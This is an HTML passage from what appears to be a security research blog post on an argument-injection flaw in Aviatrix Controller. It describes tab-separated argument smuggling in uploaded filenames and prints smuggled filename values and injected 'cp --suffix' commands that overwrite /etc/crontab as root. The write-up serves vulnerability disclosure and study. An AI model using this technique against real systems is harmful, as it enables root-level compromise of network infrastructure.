/folder/fileB\")</span></code></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">While </span><code style=\"vertical-align: baseline;\">get_system_cmd_output()</code><span style=\"vertical-align: baseline;\"> accepted a string as input, the underlying Python </span><code style=\"vertical-align: baseline;\">subprocess.check_output()</code><span style=\"vertical-align: baseline;\"> function expected a list, ie </span><code style=\"vertical-align: baseline;\">[\"cp\", \"/folder/fileA\", \"/folder/fileB\"]</code><span style=\"vertical-align: baseline;\">. To counter this, Aviatrix Controller followed the </span><a href=\"https://docs.python.org/3/library/subprocess.html#:~:text=It%20may%20not%20be%20obvious%20how%20to%20break%20a%20shell%20command%20into%20a%20sequence%20of%20arguments\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Python </span><code style=\"text-decoration: underline; vertical-align: baseline;\">subprocess</code><span style=\"text-decoration: underline; vertical-align: baseline;\"> documentation</span></a><span style=\"vertical-align: baseline;\"> and called the </span><code style=\"vertical-align: baseline;\">shlex.split()</code><span style=\"vertical-align: baseline;\"> function on the command line string. Herein lies the vulnerability, in the </span><code style=\"vertical-align: baseline;\">shlex.split()</code><span style=\"vertical-align: baseline;\"> function call.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Smuggling Arguments</span></h2>\n<p><span style=\"vertical-align: baseline;\">The </span><code style=\"vertical-align: baseline;\">shlex</code><span style=\"vertical-align: baseline;\"> module splits user input in the same way your shell interpreter would, meaning it tokenizes on all common whitespace characters,</span><span style=\"font-style: italic; vertical-align: baseline;\"> such as tab characters</span><span style=\"vertical-align: baseline;\">. This is especially interesting for us, since the file upload front-end did not sanitize or filter tabs. By adding tab characters to uploaded filenames, it would therefore be possible to smuggle command line arguments to the shell interpreter. Figure 4 shows the shlex library tokenizing tab characters as if they were spaces.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Shlex tokenizing tab characters\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/aviatrix-fig4.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 4: Shlex tokenizing tab characters</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">For example, if we uploaded a file with the following name:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><code>foobar.<span style=\"color: #d93025;\">foo</span><span style=\"color: #1a73e8;\">{TAB}</span><span style=\"color: #d93025;\">--bar</span><span style=\"color: #1a73e8;\">{TAB}</span><span style=\"color: #d93025;\">--baz</span></code></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The following file would be written to disk:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><code>{ACTION}.<span style=\"color: #d93025;\">foo</span><span style=\"color: #1a73e8;\">{TAB}</span><span style=\"color: #d93025;\">--bar</span><span style=\"color: #1a73e8;\">{TAB}</span><span style=\"color: #d93025;\">--baz</span></code></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Later on, if passed to a command-line utility such as \"</span><code style=\"vertical-align: baseline;\">cp</code><span style=\"vertical-align: baseline;\">\", the following command would be executed:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><code>$ cp {ACTION}.<span style=\"color: #d93025;\">foo --bar --baz</span> /folder/final_file</code></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This allowed us to smuggle unexpected arguments to the underlying program being called!</span></p>\n<p><span style=\"vertical-align: baseline;\">We set out to locate features that would accept file uploads </span><span style=\"font-style: italic; vertical-align: baseline;\">and</span><span style=\"vertical-align: baseline;\"> pass the partially controlled filename to a shell program. One such feature was found in the Proxy Admin utility, which allowed a custom CA Certificate file to be installed. This certificate would be obtained via file upload, stored to disk, and copied elsewhere on the filesystem via \"</span><code style=\"vertical-align: baseline;\">cp</code><span style=\"vertical-align: baseline;\">\". This is shown as follows:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\">\n<p><code><span style=\"vertical-align: baseline;\">// Disassembly of CertInstall.pyc</span></code><br /><code><span style=\"vertical-align: baseline;\">Disassembly of install:</span></code><br /><code><span style=\"vertical-align: baseline;\">[...]</span></code><br /><code><span style=\"vertical-align: baseline;\"> 81          18 LOAD_CONST               1 ('</span><span style=\"vertical-align: baseline; color: #d93025;\">sudo cp %s %s</span><span style=\"vertical-align: baseline;\">')</span></code><br /><code><span style=\"vertical-align: baseline;\">             20 LOAD_FAST                0 (self)</span></code><br /><code><span style=\"vertical-align: baseline;\">             22 LOAD_ATTR                3 (crt)</span></code><br /><code><span style=\"vertical-align: baseline;\">             24 LOAD_FAST                0 (self)</span></code><br /><code><span style=\"vertical-align: baseline;\">             26 LOAD_ATTR                4 (_local_crt)</span></code><br /><code><span style=\"vertical-align: baseline;\">[...]</span></code><br /><code><span style=\"vertical-align: baseline;\">             32 STORE_FAST               2 (cmd)</span></code><br /><code><span style=\"vertical-align: baseline;\"> 83          44 LOAD_FAST                1 (cmdset)</span></code><br /><code><span style=\"vertical-align: baseline;\">             46 LOAD_METHOD              5 (append)</span></code><br /><code><span style=\"vertical-align: baseline;\">             48 LOAD_CONST               2 ('sudo update-ca-certificates')</span></code><br /><code><span style=\"vertical-align: baseline;\">             50 CALL_METHOD              1</span></code><br /><code><span style=\"vertical-align: baseline;\">             52 POP_TOP</span></code><br /><code><span style=\"vertical-align: baseline;\">[...]</span></code><br /><code><span style=\"vertical-align: baseline;\"> 84     &gt;&gt;   54 LOAD_FAST                0 (self)</span></code><br /><code><span style=\"vertical-align: baseline;\">             56 LOAD_METHOD              6 (_exec_commands)</span></code><br /><code><span style=\"vertical-align: baseline;\">             58 LOAD_FAST                1 (cmdset)</span></code><br /><code><span style=\"vertical-align: baseline;\">             60 CALL_METHOD              1</span></code></p>\n<p><code><span style=\"vertical-align: baseline;\">class CertInstall:</span></code><br /><code><span style=\"vertical-align: baseline;\">    def install(self):</span></code><br /><code><span style=\"vertical-align: baseline;\">        cmd = f\"</span><span style=\"vertical-align: baseline; color: #d93025;\">sudo</span><span style=\"vertical-align: baseline;\"> cp </span><span style=\"vertical-align: baseline; color: #d93025;\">{injection_point}</span><span style=\"vertical-align: baseline;\"> /usr/local/share/cacertificates/test_proxy_connectivity-server_ca_cert.crt\"</span></code><br /><code><span style=\"vertical-align: baseline;\">        cmdset.append(cmd)</span></code><br /><code><span style=\"vertical-align: baseline;\">        cmdset.append(\"sudo update-ca-certificates\")</span></code><br /><code><span style=\"vertical-align: baseline;\">      return self._exec_commands(cmdset)</span></code></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This was an ideal candidate: if we could smuggle arguments to the </span><code style=\"vertical-align: baseline;\">/usr/bin/cp</code><span style=\"vertical-align: baseline;\"> program, we could theoretically copy the uploaded file over </span><span style=\"font-style: italic; vertical-align: baseline;\">elsewhere</span><span style=\"vertical-align: baseline;\"> on the filesystem. Moreover, the contents of the smuggled file, which the Controller expected to be a certificate, was fully user controllable. Our goal was now to smuggle arguments to </span><code style=\"vertical-align: baseline;\">/usr/bin/cp</code><span style=\"vertical-align: baseline;\">, to obtain an arbitrary file write primitive on the underlying filesystem. If successful, this would also execute as root, due to the </span><code style=\"vertical-align: baseline;\">cp</code><span style=\"vertical-align: baseline;\"> call being wrapped by </span><code style=\"vertical-align: baseline;\">sudo</code><span style=\"vertical-align: baseline;\">.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Certified /usr/bin/cp Hacker</span></h2>\n<p><span style=\"vertical-align: baseline;\">We then made a test bed to simulate the many exploitation requirements. Namely, we must craft a filename that follows the following requirements:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Can't use period (</span><code style=\"vertical-align: baseline;\">.</code><span style=\"vertical-align: baseline;\">) characters</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Can't use slash characters (</span><code style=\"vertical-align: baseline;\">/</code><span style=\"vertical-align: baseline;\">, or </span><code style=\"vertical-align: baseline;\">\\</code><span style=\"vertical-align: baseline;\">)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Can't use space characters</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Filename gets lowercased by the PHP front-end</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Smuggled arguments are passed in the 2nd position</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The current working directory is </span><code style=\"vertical-align: baseline;\">/</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">Easier said than done! Our injection point is the following:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><code><span style=\"vertical-align: baseline;\">$ cp /var/avxui/test_proxy_connectivityserver_ca_cert.{prefix} <br /></span><span style=\"vertical-align: baseline; color: #d93025;\">{smuggled arguments}</span><span style=\"vertical-align: baseline;\"> /usr/local/share/cacertificates/<br />test_proxy_connectivity-server_ca_cert.crt</span></code></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">For brevity, we will rewrite it as such:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><code><span style=\"vertical-align: baseline;\">$ cp {prefix} </span><span style=\"vertical-align: baseline; color: #d93025;\">{smuggled arguments}</span><span style=\"vertical-align: baseline;\"> {trailing}</span></code></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Where </span><code style=\"vertical-align: baseline;\">{prefix}</code><span style=\"vertical-align: baseline;\"> is the user-controlled filename containing our uploaded contents, and </span><code style=\"vertical-align: baseline;\">{trailing}</code><span style=\"vertical-align: baseline;\"> is the intended final certificate destination, </span><code style=\"vertical-align: baseline;\">/usr/local/share/cacertificates</code><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Relatively early on, we identified </span><code style=\"vertical-align: baseline;\">/etc/crontab</code><span style=\"vertical-align: baseline;\"> as an interesting target for file overwrite, as it did not contain a period character. That's our first requirement tackled.</span></p>\n<p><span style=\"vertical-align: baseline;\">First, we would use </span><code style=\"vertical-align: baseline;\">cp</code><span style=\"vertical-align: baseline;\"> to rename our uploaded file to \"</span><code style=\"vertical-align: baseline;\">crontab</code><span style=\"vertical-align: baseline;\">\" in the current working directory. Next, we would trigger a second </span><code style=\"vertical-align: baseline;\">cp</code><span style=\"vertical-align: baseline;\"> command to copy it over to </span><code style=\"vertical-align: baseline;\">/etc</code><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">At first, it was not obvious how to write a file to </span><code style=\"vertical-align: baseline;\">/etc</code><span style=\"vertical-align: baseline;\">, without referencing </span><code style=\"vertical-align: baseline;\">/etc</code><span style=\"vertical-align: baseline;\">, due to the no-slash limitation. One avenue for copying our weaponized crontab to </span><code style=\"vertical-align: baseline;\">/etc</code><span style=\"vertical-align: baseline;\">, without referencing the slash character, was to abuse the fact that the </span><code style=\"vertical-align: baseline;\">cp</code><span style=\"vertical-align: baseline;\"> command will treat the last argument as a </span><span style=\"font-style: italic; vertical-align: baseline;\">directory</span><span style=\"vertical-align: baseline;\"> when multiple input files are passed. In other words, if we could somehow craft a command where the final file was simply \"</span><code style=\"vertical-align: baseline;\">etc</code><span style=\"vertical-align: baseline;\">\", all previously passed filenames would be copied over to </span><code style=\"vertical-align: baseline;\">/etc</code><span style=\"vertical-align: baseline;\">, without having to specify a forward slash! From the manual:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\">\n<p><code><span style=\"vertical-align: baseline;\">SYNOPSIS</span></code><br /><code><span style=\"vertical-align: baseline;\">       <span style=\"color: #d93025;\">cp [OPTION]... SOURCE... DIRECTORY</span></span></code></p>\n<p><code><span style=\"vertical-align: baseline;\">DESCRIPTION</span></code><br /><code><span style=\"vertical-align: baseline;\">       <span style=\"color: #d93025;\">Copy SOURCE to DEST, or multiple SOURCE(s) to DIRECTORY.</span></span></code></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">However, the command we're smuggling arguments into has a trailing filename, </span><code style=\"vertical-align: baseline;\">/var/avxui/test_proxy_connectivity-server_ca_cert.txt</code><span style=\"vertical-align: baseline;\">. By carefully reading the man pages, we found this interesting argument:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\">\n<p><code><span style=\"vertical-align: baseline;\">       -S, --suffix=SUFFIX</span></code><br /><code><span style=\"vertical-align: baseline;\">              override the usual backup suffix</span></code></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">By smuggling a </span><code style=\"vertical-align: baseline;\">--suffix</code><span style=\"vertical-align: baseline;\"> argument, we could trick the </span><code style=\"vertical-align: baseline;\">cp</code><span style=\"vertical-align: baseline;\"> binary into thinking that the trailing filename was in fact a backup suffix, which would be ignored here since we are not passing the </span><code style=\"vertical-align: baseline;\">--backup</code><span style=\"vertical-align: baseline;\"> argument. In doing so, we could craft a </span><code style=\"vertical-align: baseline;\">cp</code><span style=\"vertical-align: baseline;\"> command where the final file was \"</span><code style=\"vertical-align: baseline;\">etc</code><span style=\"vertical-align: baseline;\">\". </span></p>\n<p><span style=\"vertical-align: baseline;\">We can confirm the behaviour locally, where the red parts represent the specially crafted filename:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\">\n<p><code><span style=\"vertical-align: baseline;\">$ echo BAD &gt; /var/fileupload.txt</span></code></p>\n<p><code><span style=\"font-style: italic; vertical-align: baseline;\">## Simulate first file upload, \"crontab\" file is created at the root</span></code></p>\n<p><code><span style=\"vertical-align: baseline;\">$ cp /var/fileupload.</span><span style=\"vertical-align: baseline; color: #d93025;\">txt crontab --suffix</span><span style=\"vertical-align: baseline;\"> /usr/local/cert…</span></code></p>\n<p><code><span style=\"vertical-align: baseline;\">$ cat /crontab</span></code></p>\n<p><code><span style=\"vertical-align: baseline;\">BAD</span></code></p>\n<p><code><span style=\"font-style: italic; vertical-align: baseline;\">## Simulate second file upload, \"crontab\" is copied over to /etc</span></code></p>\n<p><code><span style=\"vertical-align: baseline;\">$ cp /var/fileupload.</span><span style=\"vertical-align: baseline; color: #d93025;\">txt crontab etc --suffix</span><span style=\"vertical-align: baseline;\"> /usr/local/cert…</span></code></p>\n<p><code><span style=\"vertical-align: baseline;\">$ cat /etc/crontab</span></code></p>\n<p><code><span style=\"vertical-align: baseline;\">BAD</span></code></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">A live example is shown in Figure 5.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Argument smuggling leading to arbitrary file write\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/aviatrix-fig5.gif\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 5: Argument smuggling leading to arbitrary file write</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Putting It All Together</span></h2>\n<p><span style=\"vertical-align: baseline;\">At this point, we theorized an argument injection exploit, and it was time to see if it worked. </span></p>\n<p><span style=\"vertical-align: baseline;\">1. We first uploaded a CA Certificate file containing a simple crontab file, called </span><code style=\"vertical-align: baseline;\">dummy.<span style=\"color: #d93025;\">txt</span></code><span style=\"vertical-align: baseline;\">, which would be stored as </span><code style=\"vertical-align: baseline;\">/var/avxui/test_proxy_connectivityserver_ca_cert.<span style=\"color: #d93025;\">txt</span></code><span style=\"vertical-align: baseline;\"> on the filesystem, shown in Figure 6. This file will later be renamed to </span><code style=\"vertical-align: baseline;\">crontab</code><span style=\"vertical-align: baseline;\">, and moved over to </span><code style=\"vertical-align: baseline;\">/etc</code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Creating a local file containing our malicious crontab\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/aviatrix-fig6.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 6: Creating a local file containing our malicious crontab</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">2. Next, we performed the first argument injection attack, renaming the </span><code style=\"vertical-align: baseline;\">test_proxy_connectivityserver_ca_cert.txt</code><span style=\"vertical-align: baseline;\"> file to </span><code style=\"vertical-align: baseline;\">crontab</code><span style=\"vertical-align: baseline;\">, shown in Figure 7.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Creating a local file with smuggled arguments in the file extension\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/aviatrix-fig7.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 7: Creating a local file with smuggled arguments in the file extension</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The literal command that is executed following that HTTP request is:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><code><span style=\"vertical-align: baseline;\">/usr/bin/cp </span><span style=\"vertical-align: baseline; color: #1a73e8;\">/var/avxui/test_proxy_connectivity-server_ca_cert.txt</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline; color: #d93025;\">crontab</span><span style=\"vertical-align: baseline;\"> <br />--suffix /usr/local/share/ca-certificates/<br />test_proxy_connectivity-server_ca_cert.crt</span></code></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">As explained, the </span><code style=\"vertical-align: baseline;\">--suffix</code><span style=\"vertical-align: baseline;\"> argument will drop the trailing filename, and so the </span><code style=\"vertical-align: baseline;\">cp</code><span style=\"vertical-align: baseline;\"> command can be shortened to the following:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: 